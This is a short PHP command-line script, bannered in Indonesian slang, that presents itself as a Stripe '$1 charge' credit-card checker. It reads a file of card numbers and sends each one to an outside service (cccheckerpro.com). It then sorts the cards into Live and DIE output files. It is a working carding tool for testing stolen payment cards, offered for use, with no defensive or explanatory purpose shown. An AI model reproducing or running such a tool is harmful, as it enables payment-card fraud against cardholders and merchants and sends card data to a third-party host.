<?php
echo "----Hai, Welcome To NgecheckAsu----\n";
echo "CC checker Merchant Stripe Charge $1\n";
echo "Note: Supported Card Visa, Mastercard, AMEX, Discover Card\n";
echo "----thank : all member bin tuyul---\n\n";
  do {
    $pathFile = input("nama file cc nya boss");
    if(empty($pathFile)) {
    $initiateRepeat = 1;
      } else if(!file_exists($pathFile)) {
        $initiateRepeat = 1;
      } else {
        $initiateRepeat = 0;
      }
    } while($initiateRepeat);
    
    
$delimeter = explode("\n", trim(file_get_contents($pathFile)));
$checkTotal = 0;
$amountList = count($delimeter);
    
  foreach($delimeter as $format) {
  $format = trim($format);
  $string = file_get_contents("https://cccheckerpro.com/api.php?lista=".trim($format));
  $response =  preg_replace("/cccheckerpro.com/", "", $string);
 
  if($response == "Live") {
      echo "[".$checkTotal."/".$amountList."] ".$response."\n";
      file_put_contents("Live.txt", $response."\n", FILE_APPEND);
      } else {
        echo "[".$checkTotal."/".$amountList."] ".$response."\n";
        file_put_contents("DIE.txt", $format."\n", FILE_APPEND);
      }
        $checkTotal++;
    }
    
    function input($text) {
      echo $text.": ";
      $a = trim(fgets(STDIN));
      return $a;
    }
?>
